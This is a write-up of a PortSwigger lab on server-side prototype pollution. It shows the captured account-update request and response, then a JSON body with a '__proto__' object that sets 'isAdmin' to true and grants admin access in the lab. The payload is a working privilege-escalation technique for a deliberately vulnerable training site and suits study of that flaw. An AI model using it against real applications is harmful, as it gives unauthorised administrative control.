# [Privilege escalation via server-side prototype pollution] — [PortSwigger] — [Practitioner]
**Date:** 2026-08-03
 
---
 
## Vulnerability / core concept
Server-side Prototype Pollution

---


## Payload / key command
When we visit our profile using `/my-account?id=wiener` endpoint, we can notice that we can edit the information about our user by submitting the form. Intercepting this submission returns us the following POST request body:
```js
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"Aze",
   "sessionId":"VzZPQA4DyjEwwp9TWYXMh7fwKqGDzPGO"
}
```
We are also able to see the properties in the following HTTP response:
```js
{
   "username":"wiener",
   "firstname":"Peter",
   "lastname":"Wiener",
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"Aze",
   "isAdmin":false
}
```

Having this information we can start our prototype pollution by sending the following request:
```js
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"Aze",
   "sessionId":"VzZPQA4DyjEwwp9TWYXMh7fwKqGDzPGO",
   "__proto__":{
      "isAdmin":true
   }
}
```
Here, we are assigning the inherited `isAdmin` property the value `true`. The response for this request is this:
```js
{
   "username":"wiener",
   "firstname":"Peter",
   "lastname":"Wiener",
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"Aze",
   "isAdmin":true
}
```
As you can see, we successfully polluted the prototype and escalated our privilege to admin. Now we can access admin panel and delete user `carlos` to solve this lab.
